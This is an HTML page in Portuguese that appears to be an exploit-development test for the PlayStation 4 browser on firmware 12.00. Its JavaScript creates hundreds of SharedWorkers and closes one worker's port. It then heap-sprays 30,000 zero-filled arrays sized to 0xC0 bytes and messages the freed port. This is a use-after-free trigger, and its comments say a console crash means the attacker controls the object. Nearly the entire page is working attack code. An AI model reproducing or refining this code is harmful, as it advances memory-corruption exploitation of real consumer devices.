<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 ZERO SPRAY (0xC0)</title>
    
</head>
<body>
    <h1>ZERO SPRAY TEST (0xC0)</h1>
    <p>Se der Panic com ZEROS, o tamanho 0xC0 é o correto.</p>
    <button onclick="run_zero()">DISPARAR ZEROS</button>
    <div id="log"></div>

    <script>
        function log(msg) { document.getElementById("log").innerHTML += `<div>${msg}</div>`; }

        async function run_zero() {
            log("Preparando Payload de Zeros (0xC0)...");
            
            // 0xC0 = 192 bytes.
            // Double Array: (192 - 16) / 8 = 22 elementos.
            var arr = new Array(22);
            for(var i=0; i<22; i++) arr[i] = 0.0; // 0x0000000000000000

            var workers = [];
            for(let i=0; i<380; i++) {
                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            var count = 0;
            var it = setInterval(() => {
                if(count >= 23) { // Limite 403
                    clearInterval(it);
                    
                    var v = workers.pop();
                    var p = v.port;
                    v.port.close();
                    
                    var spray = [];
                    for(var k=0; k<30000; k++) spray.push(arr.slice(0));
                    
                    log("Spray disparado. Tentando acessar...");
                    
                    try { p.postMessage("ZERO"); } catch(e){}
                    
                    // Se o console não desligar em 10s, ZEROS são seguros.
                    // Se desligar, CONTROLAMOS O OBJETO!
                    return;
                }
                try { workers.push(new SharedWorker("data:text,1", "v"+count)); } catch(e){}
                count++;
            }, 50);
        }
    </script>
</body>
</html>
